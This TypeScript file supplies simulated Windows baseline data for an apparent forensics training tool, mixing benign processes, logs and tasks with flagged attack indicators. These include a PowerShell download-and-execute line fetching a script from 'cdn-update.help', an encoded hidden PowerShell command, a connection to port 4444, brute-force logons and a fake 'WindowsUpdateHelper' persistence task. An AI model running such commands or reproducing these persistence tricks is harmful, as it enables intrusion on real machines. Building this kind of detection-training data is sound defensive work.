/**
 * Baseline Windows-realistic content rendered alongside per-case malicious
 * artifacts. Keeps every tool densely populated regardless of case payload.
 */
import type {
  EventLogEntry,
  NetworkConnection,
  ProcessEntry,
  ScheduledTaskDef,
  UserAccountDef,
} from '../types/case.types'

export interface BaselineFile {
  name: string
  type: 'dir' | 'file'
  sizeKb?: number
  modified: string
  suspicious?: boolean
  hint?: string
}

export const BASELINE_PROCESSES: ProcessEntry[] = [
  { pid: 4, ppid: 0, name: 'System', sessionName: 'Services', sessionNum: 0, memKb: 144, user: 'SYSTEM', cpuPercent: 0.1, status: 'Running' },
  { pid: 348, ppid: 4, name: 'smss.exe', sessionName: 'Services', sessionNum: 0, memKb: 1104, user: 'SYSTEM', cpuPercent: 0.0, status: 'Running' },
  { pid: 528, ppid: 348, name: 'csrss.exe', sessionName: 'Services', sessionNum: 0, memKb: 5204, user: 'SYSTEM', cpuPercent: 0.2, status: 'Running' },
  { pid: 608, ppid: 348, name: 'wininit.exe', sessionName: 'Services', sessionNum: 0, memKb: 5048, user: 'SYSTEM', cpuPercent: 0.0, status: 'Running' },
  { pid: 680, ppid: 608, name: 'services.exe', sessionName: 'Services', sessionNum: 0, memKb: 7140, user: 'SYSTEM', cpuPercent: 0.3, status: 'Running' },
  { pid: 688, ppid: 608, name: 'lsass.exe', sessionName: 'Services', sessionNum: 0, memKb: 16448, user: 'SYSTEM', cpuPercent: 0.4, status: 'Running', services: ['Netlogon', 'SamSs'] },
  { pid: 848, ppid: 680, name: 'svchost.exe', sessionName: 'Services', sessionNum: 0, memKb: 27344, user: 'SYSTEM', cpuPercent: 0.6, status: 'Running', services: ['RpcSs'] },
  { pid: 1096, ppid: 680, name: 'svchost.exe', sessionName: 'Services', sessionNum: 0, memKb: 14820, user: 'SYSTEM', cpuPercent: 0.2, status: 'Running', services: ['Schedule'] },
  { pid: 1248, ppid: 680, name: 'svchost.exe', sessionName: 'Services', sessionNum: 0, memKb: 11240, user: 'NETWORK SERVICE', cpuPercent: 0.1, status: 'Running', services: ['TermService'] },
  { pid: 1872, ppid: 680, name: 'svchost.exe', sessionName: 'Services', sessionNum: 0, memKb: 8920, user: 'LOCAL SERVICE', cpuPercent: 0.1, status: 'Running', services: ['Dnscache'] },
  { pid: 2104, ppid: 680, name: 'spoolsv.exe', sessionName: 'Services', sessionNum: 0, memKb: 9264, user: 'SYSTEM', cpuPercent: 0.0, status: 'Running' },
  { pid: 2480, ppid: 680, name: 'MsMpEng.exe', sessionName: 'Services', sessionNum: 0, memKb: 178660, user: 'SYSTEM', cpuPercent: 1.8, status: 'Running', services: ['WinDefend'] },
  { pid: 3024, ppid: 1248, name: 'winlogon.exe', sessionName: 'Console', sessionNum: 1, memKb: 6112, user: 'SYSTEM', cpuPercent: 0.0, status: 'Running' },
  { pid: 3168, ppid: 3024, name: 'dwm.exe', sessionName: 'Console', sessionNum: 1, memKb: 41208, user: 'DWM-1', cpuPercent: 1.4, status: 'Running' },
  { pid: 3540, ppid: 3024, name: 'explorer.exe', sessionName: 'Console', sessionNum: 1, memKb: 92340, user: '__USER__', cpuPercent: 0.7, status: 'Running' },
  { pid: 4012, ppid: 3540, name: 'OneDrive.exe', sessionName: 'Console', sessionNum: 1, memKb: 65120, user: '__USER__', cpuPercent: 0.2, status: 'Running' },
  { pid: 4528, ppid: 3540, name: 'Teams.exe', sessionName: 'Console', sessionNum: 1, memKb: 187432, user: '__USER__', cpuPercent: 1.1, status: 'Running' },
  { pid: 5040, ppid: 3540, name: 'chrome.exe', sessionName: 'Console', sessionNum: 1, memKb: 412668, user: '__USER__', cpuPercent: 4.3, status: 'Running' },
  { pid: 5512, ppid: 5040, name: 'chrome.exe', sessionName: 'Console', sessionNum: 1, memKb: 142884, user: '__USER__', cpuPercent: 0.6, status: 'Running' },
  { pid: 6188, ppid: 3540, name: 'OUTLOOK.EXE', sessionName: 'Console', sessionNum: 1, memKb: 234112, user: '__USER__', cpuPercent: 0.9, status: 'Running' },
]

export function baselineProcessesFor(user: string): ProcessEntry[] {
  return BASELINE_PROCESSES.map((p) => ({
    ...p,
    user: p.user === '__USER__' ? user : p.user,
  }))
}

export const BASELINE_NETWORK: (host: string) => NetworkConnection[] = (host) => [
  {
    proto: 'TCP',
    local: '0.0.0.0:135',
    foreign: '0.0.0.0:0',
    state: 'LISTENING',
    pid: 848,
    processName: 'svchost.exe',
    bytesIn: 0,
    bytesOut: 0,
  },
  {
    proto: 'TCP',
    local: '0.0.0.0:445',
    foreign: '0.0.0.0:0',
    state: 'LISTENING',
    pid: 4,
    processName: 'System',
    bytesIn: 0,
    bytesOut: 0,
  },
  {
    proto: 'TCP',
    local: '0.0.0.0:3389',
    foreign: '0.0.0.0:0',
    state: 'LISTENING',
    pid: 1248,
    processName: 'svchost.exe',
    bytesIn: 0,
    bytesOut: 0,
  },
  {
    proto: 'TCP',
    local: `${host}:49231`,
    foreign: '52.96.165.34:443',
    state: 'ESTABLISHED',
    pid: 6188,
    processName: 'OUTLOOK.EXE',
    bytesIn: 884_120,
    bytesOut: 412_330,
  },
  {
    proto: 'TCP',
    local: `${host}:49445`,
    foreign: '142.250.80.46:443',
    state: 'ESTABLISHED',
    pid: 5040,
    processName: 'chrome.exe',
    bytesIn: 2_104_880,
    bytesOut: 611_040,
  },
  {
    proto: 'TCP',
    local: `${host}:49502`,
    foreign: '52.114.128.74:443',
    state: 'ESTABLISHED',
    pid: 4528,
    processName: 'Teams.exe',
    bytesIn: 3_402_100,
    bytesOut: 891_220,
  },
  {
    proto: 'TCP',
    local: `${host}:49612`,
    foreign: '13.107.6.158:443',
    state: 'ESTABLISHED',
    pid: 4012,
    processName: 'OneDrive.exe',
    bytesIn: 144_200,
    bytesOut: 52_880,
  },
  {
    proto: 'TCP',
    local: `${host}:51342`,
    foreign: '185.220.101.8:4444',
    state: 'ESTABLISHED',
    pid: 8812,
    processName: '7z.exe',
    malicious: true,
    bytesIn: 22_400,
    bytesOut: 408_900,
  },
  {
    proto: 'TCP',
    local: `${host}:51902`,
    foreign: '10.0.1.22:445',
    state: 'ESTABLISHED',
    pid: 3540,
    processName: 'explorer.exe',
    bytesIn: 12_400,
    bytesOut: 28_100,
  },
  {
    proto: 'TCP',
    local: `${host}:52188`,
    foreign: '93.184.216.34:80',
    state: 'TIME_WAIT',
    pid: 5040,
    processName: 'chrome.exe',
    bytesIn: 4_200,
    bytesOut: 8_900,
  },
  {
    proto: 'UDP',
    local: '0.0.0.0:5355',
    foreign: '*:*',
    state: '',
    pid: 1872,
    processName: 'svchost.exe',
    bytesIn: 88_200,
    bytesOut: 112_400,
  },
]

/** Unique baseline Security/System/Application events — distinct XML + summaries per row. */
export function generateBaselineEvents(host: string, user: string): EventLogEntry[] {
  const esc = (s: string) =>
    s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;')

  const rows: Omit<EventLogEntry, 'id'>[] = [
    {
      log: 'Security',
      level: 'Success Audit',
      time: '2026-05-08T02:41:22Z',
      source: 'Microsoft-Windows-Security-Auditing',
      eventId: 4624,
      task: 'Logon',
      computer: host,
      summary: `Type 2 Interactive — ${user} @ ${host} (console) Src: Local`,
      riskTier: 'info',
      xml: `<Event><System><Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-772EA3319543}" /><EventID>4624</EventID><TimeCreated SystemTime="2026-05-08T02:41:22Z"/><Computer>${esc(host)}</Computer></System><EventData><Data Name="TargetUserName">${esc(user)}</Data><Data Name="LogonType">2</Data><Data Name="IpAddress">127.0.0.1</Data><Data Name="WorkstationName">${esc(host)}</Data></EventData></Event>`,
    },
    {
      log: 'Security',
      level: 'Success Audit',
      time: '2026-05-08T02:52:09Z',
      source: 'Microsoft-Windows-Security-Auditing',
      eventId: 4624,
      task: 'Logon',
      computer: host,
      summary: `Type 3 Network — svc_backup from FS-BACKUP01 Src IP 10.0.12.44`,
      riskTier: 'info',
      xml: `<Event><System><EventID>4624</EventID><Provider Name="Microsoft-Windows-Security-Auditing"/><TimeCreated SystemTime="2026-05-08T02:52:09Z"/><Computer>${esc(host)}</Computer></System><EventData><Data Name="TargetUserName">svc_backup</Data><Data Name="LogonType">3</Data><Data Name="IpAddress">10.0.12.44</Data><Data Name="WorkstationName">FS-BACKUP01</Data></EventData></Event>`,
    },
    {
      log: 'Security',
      level: 'Success Audit',
      time: '2026-05-08T03:05:44Z',
      source: 'Microsoft-Windows-Security-Auditing',
      eventId: 4624,
      task: 'Logon',
      computer: host,
      summary: `Type 10 RemoteInteractive — helpdesk02 via GW-RDP from 203.0.113.88`,
      riskTier: 'warn',
      xml: `<Event><System><EventID>4624</EventID><Provider Name="Microsoft-Windows-Security-Auditing"/><TimeCreated SystemTime="2026-05-08T03:05:44Z"/><Computer>${esc(host)}</Computer></System><EventData><Data Name="TargetUserName">helpdesk02</Data><Data Name="LogonType">10</Data><Data Name="IpAddress">203.0.113.88</Data><Data Name="WorkstationName">GW-RDP</Data></EventData></Event>`,
    },
    {
      log: 'Security',
      level: 'Failure Audit',
      time: '2026-05-08T03:07:01Z',
      source: 'Microsoft-Windows-Security-Auditing',
      eventId: 4625,
      task: 'Logon',
      computer: host,
      summary: `Brute attempt — Administrator failed (bad pwd) Src 185.220.101.44`,
      riskTier: 'critical',
      malicious: true,
      xml: `<Event><System><EventID>4625</EventID><Provider Name="Microsoft-Windows-Security-Auditing"/><TimeCreated SystemTime="2026-05-08T03:07:01Z"/><Computer>${esc(host)}</Computer></System><EventData><Data Name="TargetUserName">Administrator</Data><Data Name="FailureReason">%%2313</Data><Data Name="IpAddress">185.220.101.44</Data><Data Name="WorkstationName">UNKNOWN</Data></EventData></Event>`,
    },
    {
      log: 'Security',
      level: 'Failure Audit',
      time: '2026-05-08T03:07:03Z',
      source: 'Microsoft-Windows-Security-Auditing',
      eventId: 4625,
      task: 'Logon',
      computer: host,
      summary: `Brute attempt — payroll_svc unknown user Src 185.220.101.44`,
      riskTier: 'critical',
      malicious: true,
      xml: `<Event><System><EventID>4625</EventID><TimeCreated SystemTime="2026-05-08T03:07:03Z"/><Computer>${esc(host)}</Computer></System><EventData><Data Name="TargetUserName">payroll_svc</Data><Data Name="SubStatus">0xc0000064</Data><Data Name="IpAddress">185.220.101.44</Data></EventData></Event>`,
    },
    {
      log: 'Security',
      level: 'Success Audit',
      time: '2026-05-08T03:08:11Z',
      source: 'Microsoft-Windows-Security-Auditing',
      eventId: 4634,
      task: 'Logoff',
      computer: host,
      summary: `Logoff session ${user} Type 2 duration 3842s`,
      riskTier: 'info',
      xml: `<Event><System><EventID>4634</EventID><Provider Name="Microsoft-Windows-Security-Auditing"/><TimeCreated SystemTime="2026-05-08T03:08:11Z"/><Computer>${esc(host)}</Computer></System><EventData><Data Name="TargetUserName">${esc(user)}</Data><Data Name="LogonType">2</Data></EventData></Event>`,
    },
    {
      log: 'Security',
      level: 'Success Audit',
      time: '2026-05-08T03:09:02Z',
      source: 'Microsoft-Windows-Security-Auditing',
      eventId: 4688,
      task: 'Process Creation',
      computer: host,
      summary: `7z x invoice_lnk.7z -oC:\\Users\\Public\\tmp — PID 8812`,
      riskTier: 'critical',
      malicious: true,
      xml: `<Event><System><EventID>4688</EventID><Provider Name="Microsoft-Windows-Security-Auditing"/><TimeCreated SystemTime="2026-05-08T03:09:02Z"/><Computer>${esc(host)}</Computer></System><EventData><Data Name="NewProcessName">C:\\Program Files\\7-Zip\\7z.exe</Data><Data Name="CommandLine">7z x invoice_lnk.7z -oC:\\Users\\Public\\tmp -y</Data><Data Name="SubjectUserName">${esc(user)}</Data></EventData></Event>`,
    },
    {
      log: 'Security',
      level: 'Success Audit',
      time: '2026-05-08T03:09:18Z',
      source: 'Microsoft-Windows-Security-Auditing',
      eventId: 4688,
      task: 'Process Creation',
      computer: host,
      summary: `powershell -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIA...`,
      riskTier: 'critical',
      malicious: true,
      xml: `<Event><System><EventID>4688</EventID><TimeCreated SystemTime="2026-05-08T03:09:18Z"/><Computer>${esc(host)}</Computer></System><EventData><Data Name="NewProcessName">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name="CommandLine">powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA</Data></EventData></Event>`,
    },
    {
      log: 'Security',
      level: 'Success Audit',
      time: '2026-05-08T03:09:31Z',
      source: 'Microsoft-Windows-Security-Auditing',
      eventId: 4698,
      task: 'Scheduled Task',
      computer: host,
      summary: `Task "\\WindowsUpdateHelper" created — runs msupdate.exe 03:00 daily`,
      riskTier: 'critical',
      malicious: true,
      xml: `<Event><System><EventID>4698</EventID><Provider Name="Microsoft-Windows-Security-Auditing"/><TimeCreated SystemTime="2026-05-08T03:09:31Z"/><Computer>${esc(host)}</Computer></System><EventData><Data Name="TaskName">\\WindowsUpdateHelper</Data><Data Name="SubjectUserName">${esc(user)}</Data><Data Name="Xml">&lt;Exec&gt;&lt;Command&gt;C:\\Users\\cleared.user\\AppData\\Roaming\\msupdate.exe&lt;/Command&gt;&lt;/Exec&gt;</Data></EventData></Event>`,
    },
    {
      log: 'Security',
      level: 'Success Audit',
      time: '2026-05-08T03:10:02Z',
      source: 'Microsoft-Windows-Security-Auditing',
      eventId: 4720,
      task: 'User Mgmt',
      computer: host,
      summary: `Local user "_svc_patch" created by DOMAIN\\tier1-admin`,
      riskTier: 'warn',
      xml: `<Event><System><EventID>4720</EventID><Provider Name="Microsoft-Windows-Security-Auditing"/><TimeCreated SystemTime="2026-05-08T03:10:02Z"/><Computer>${esc(host)}</Computer></System><EventData><Data Name="TargetUserName">_svc_patch</Data><Data Name="SubjectUserName">tier1-admin</Data></EventData></Event>`,
    },
    {
      log: 'Security',
      level: 'Success Audit',
      time: '2026-05-08T03:10:41Z',
      source: 'Microsoft-Windows-Security-Auditing',
      eventId: 4732,
      task: 'Group Mgmt',
      computer: host,
      summary: `_svc_patch added to group Remote Desktop Users`,
      riskTier: 'warn',
      xml: `<Event><System><EventID>4732</EventID><TimeCreated SystemTime="2026-05-08T03:10:41Z"/><Computer>${esc(host)}</Computer></System><EventData><Data Name="MemberName">_svc_patch</Data><Data Name="TargetUserName">Remote Desktop Users</Data></EventData></Event>`,
    },
    {
      log: 'System',
      level: 'Information',
      time: '2026-05-08T03:11:05Z',
      source: 'Service Control Manager',
      eventId: 7036,
      task: 'Service Control',
      computer: host,
      summary: `Service "WinDefend" entered STOPPED state`,
      riskTier: 'warn',
      xml: `<Event><System><EventID>7036</EventID><Provider Name="Service Control Manager"/><TimeCreated SystemTime="2026-05-08T03:11:05Z"/><Computer>${esc(host)}</Computer></System><EventData><Data Name="param1">Windows Defender Antivirus Service</Data><Data Name="param2">stopped</Data></EventData></Event>`,
    },
    {
      log: 'System',
      level: 'Information',
      time: '2026-05-08T03:11:22Z',
      source: 'Service Control Manager',
      eventId: 7036,
      task: 'Service Control',
      computer: host,
      summary: `Service "Sense" entered RUNNING state`,
      riskTier: 'info',
      xml: `<Event><System><EventID>7036</EventID><Provider Name="Service Control Manager"/><TimeCreated SystemTime="2026-05-08T03:11:22Z"/><Computer>${esc(host)}</Computer></System><EventData><Data Name="param1">Sense</Data><Data Name="param2">running</Data></EventData></Event>`,
    },
    {
      log: 'Application',
      level: 'Error',
      time: '2026-05-08T03:12:01Z',
      source: 'Application Error',
      eventId: 1000,
      task: 'Application Crashing Events',
      computer: host,
      summary: `Faulting app MsMpEng.exe 0xc0000005 at ntdll.dll+0x4f2aa`,
      riskTier: 'warn',
      xml: `<Event><System><EventID>1000</EventID><Provider Name="Application Error"/><TimeCreated SystemTime="2026-05-08T03:12:01Z"/><Computer>${esc(host)}</Computer></System><EventData><Data Name="AppName">MsMpEng.exe</Data><Data Name="AppVersion">4.18.24090.11</Data><Data Name="ExceptionCode">0xc0000005</Data><Data Name="FaultingModule">ntdll.dll</Data></EventData></Event>`,
    },
    {
      log: 'Security',
      level: 'Success Audit',
      time: '2026-05-08T03:12:44Z',
      source: 'Microsoft-Windows-Security-Auditing',
      eventId: 4688,
      task: 'Process Creation',
      computer: host,
      summary: `Clean: OUTLOOK.EXE launching under ${user}`,
      riskTier: 'info',
      xml: `<Event><System><EventID>4688</EventID><TimeCreated SystemTime="2026-05-08T03:12:44Z"/><Computer>${esc(host)}</Computer></System><EventData><Data Name="NewProcessName">C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE</Data><Data Name="SubjectUserName">${esc(user)}</Data></EventData></Event>`,
    },
    {
      log: 'PowerShell',
      level: 'Warning',
      time: '2026-05-08T03:13:02Z',
      source: 'PowerShell',
      eventId: 4104,
      task: 'Execute a Remote Command',
      computer: host,
      summary: `Script block logged — Invoke-WebRequest .download cradle`,
      riskTier: 'critical',
      malicious: true,
      xml: `<Event><System><EventID>4104</EventID><Provider Name="Microsoft-Windows-PowerShell"/><TimeCreated SystemTime="2026-05-08T03:13:02Z"/><Computer>${esc(host)}</Computer></System><EventData><Data Name="ScriptBlockText">IWR http://cdn-update.help/ms.ps1 -UseBasicParsing | iex</Data></EventData></Event>`,
    },
  ]

  return rows.map((r, idx) => ({
    ...r,
    id: `evt-base-${r.eventId}-${idx}-${host.slice(-2)}`,
  }))
}

export const BASELINE_TASKS: ScheduledTaskDef[] = [
  {
    name: '\\Microsoft\\Windows\\UpdateOrchestrator\\Schedule Scan',
    status: 'Ready',
    triggers: 'Daily at 03:00',
    nextRun: '2026-05-09T03:00:00Z',
    lastRun: '2026-05-08T03:00:00Z',
    author: 'CORP\\svc_update',
    runAs: 'SYSTEM',
    command: '%systemroot%\\system32\\usoclient.exe StartScan',
    xml: '<Task><Triggers><CalendarTrigger><StartBoundary>2026-05-08T03:00:00</StartBoundary></CalendarTrigger></Triggers></Task>',
  },
  {
    name: '\\Microsoft\\Windows\\Defrag\\ScheduledDefrag',
    status: 'Ready',
    triggers: 'Weekly on Wednesday',
    nextRun: '2026-05-13T01:00:00Z',
    lastRun: '2026-05-06T01:00:00Z',
    author: 'Microsoft Corporation',
    runAs: 'SYSTEM',
    command: '%windir%\\system32\\defrag.exe -c -h -o',
    xml: '<Task><Triggers><CalendarTrigger><ScheduleByWeek/></CalendarTrigger></Triggers></Task>',
  },
  {
    name: '\\Microsoft\\Windows\\WindowsBackup\\Backup',
    status: 'Ready',
    triggers: 'Daily at 22:00',
    nextRun: '2026-05-08T22:00:00Z',
    lastRun: '2026-05-07T22:00:00Z',
    author: 'Microsoft Corporation',
    runAs: 'SYSTEM',
    command: '%windir%\\system32\\sdclt.exe /KICKOFFJOB',
    xml: '<Task/>',
  },
  {
    name: '\\Microsoft\\Office\\OfficeTelemetryAgentLogOn',
    status: 'Ready',
    triggers: 'At log on',
    nextRun: '',
    lastRun: '2026-05-08T08:14:00Z',
    author: 'Microsoft Corporation',
    runAs: '__USER__',
    command: '"C:\\Program Files\\Microsoft Office\\root\\Office16\\msoia.exe"',
    xml: '<Task/>',
  },
  {
    name: '\\Microsoft\\Windows\\SysMain\\HybridSleep',
    status: 'Disabled',
    triggers: 'Idle maintenance',
    nextRun: '',
    lastRun: '2026-05-07T18:22:00Z',
    author: 'Microsoft Corporation',
    runAs: 'SYSTEM',
    command: '%windir%\\system32\\rundll32.exe sysmain.dll,PfSvWsSwapSleepStudy',
    xml: '<Task><Settings><Enabled>false</Enabled></Settings></Task>',
  },
  {
    name: '\\WindowsUpdateHelper',
    status: 'Ready',
    triggers: 'Daily at 03:00',
    nextRun: '2026-05-09T03:00:00Z',
    lastRun: '2026-05-08T03:00:12Z',
    author: 'CORP\\cleared.user',
    runAs: 'cleared.user',
    command: 'C:\\Users\\cleared.user\\AppData\\Roaming\\msupdate.exe',
    xml:
      '<Task><Triggers><DailyTrigger><StartBoundary>2026-05-09T03:00:00</StartBoundary></DailyTrigger></Triggers><Actions><Exec><Command>C:\\Users\\cleared.user\\AppData\\Roaming\\msupdate.exe</Command></Exec></Actions></Task>',
    malicious: true,
  },
]

export function baselineTasksFor(user: string): ScheduledTaskDef[] {
  return BASELINE_TASKS.map((t) => ({ ...t, runAs: t.runAs === '__USER__' ? user : t.runAs }))
}

export const BASELINE_USERS: UserAccountDef[] = [
  {
    name: 'Administrator',
    fullName: 'Built-in Administrator',
    description: 'Built-in account for administering the computer/domain',
    enabled: false,
    lastLogon: '2026-04-12T18:34:00Z',
    passwordAge: '178 days',
    groups: ['Administrators'],
    created: '2023-01-15T09:00:00Z',
    sid: 'S-1-5-21-111-222-333-500',
  },
  {
    name: 'Guest',
    fullName: '',
    description: 'Built-in account for guest access to the computer/domain',
    enabled: false,
    lastLogon: 'Never',
    passwordAge: 'Never',
    groups: ['Guests'],
    created: '2023-01-15T09:00:00Z',
    sid: 'S-1-5-21-111-222-333-501',
  },
  {
    name: 'DefaultAccount',
    fullName: '',
    description: 'A user account managed by the system.',
    enabled: false,
    lastLogon: 'Never',
    passwordAge: 'Never',
    groups: [],
    created: '2023-01-15T09:00:00Z',
    sid: 'S-1-5-21-111-222-333-503',
  },
]

export interface BaselineRegRow {
  hive: 'HKLM' | 'HKCU'
  key: string
  name: string
  type: 'REG_SZ' | 'REG_DWORD' | 'REG_EXPAND_SZ'
  data: string
  suspicious?: boolean
  hint?: string
}

export const BASELINE_REGISTRY_RUNS: BaselineRegRow[] = [
  {
    hive: 'HKLM',
    key: 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
    name: 'SecurityHealth',
    type: 'REG_EXPAND_SZ',
    data: '%windir%\\system32\\SecurityHealthSystray.exe',
  },
  {
    hive: 'HKLM',
    key: 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
    name: 'RTHDVCPL',
    type: 'REG_SZ',
    data: '"C:\\Program Files\\Realtek\\Audio\\HDA\\RtkNGUI64.exe" -s',
  },
  {
    hive: 'HKLM',
    key: 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
    name: 'IgfxTray',
    type: 'REG_SZ',
    data: 'C:\\Windows\\System32\\igfxtray.exe',
  },
  {
    hive: 'HKCU',
    key: 'Software\\Microsoft\\Windows\\CurrentVersion\\Run',
    name: 'OneDrive',
    type: 'REG_SZ',
    data: '"C:\\Users\\__USER__\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe" /background',
  },
  {
    hive: 'HKCU',
    key: 'Software\\Microsoft\\Windows\\CurrentVersion\\Run',
    name: 'Teams',
    type: 'REG_SZ',
    data: '"C:\\Users\\__USER__\\AppData\\Local\\Microsoft\\Teams\\Update.exe" --processStart "Teams.exe" --process-start-args "--system-initiated"',
  },
]

export function baselineRunKeysFor(user: string): BaselineRegRow[] {
  return BASELINE_REGISTRY_RUNS.map((r) => ({
    ...r,
    data: r.data.replace(/__USER__/g, user),
  }))
}

export function baselineFiles(user: string, suspiciousArchive?: string): BaselineFile[] {
  const baseDate = '2026-05-07T11:14:00Z'
  return [
    { name: 'Desktop', type: 'dir', modified: '2026-05-08T08:32:00Z' },
    { name: 'Documents', type: 'dir', modified: '2026-05-07T16:21:00Z' },
    { name: 'Downloads', type: 'dir', modified: '2026-05-08T09:02:00Z' },
    { name: 'Pictures', type: 'dir', modified: '2026-05-04T13:11:00Z' },
    { name: 'AppData', type: 'dir', modified: '2026-04-22T07:00:00Z' },
    { name: '.ssh', type: 'dir', modified: '2026-03-18T19:42:00Z' },
    { name: `notes_${user}.txt`, type: 'file', sizeKb: 4, modified: baseDate },
    { name: 'Q2_forecast.xlsx', type: 'file', sizeKb: 84, modified: '2026-05-06T15:21:00Z' },
    { name: 'meeting_recording.mp4', type: 'file', sizeKb: 184_320, modified: '2026-05-05T10:01:00Z' },
    {
      name: suspiciousArchive ?? 'invoice_q2_signed.7z',
      type: 'file',
      sizeKb: 12_440,
      modified: '2026-05-08T03:09:00Z',
      suspicious: true,
      hint: 'Recent archive in user profile, no preceding signed installer event.',
    },
  ]
}
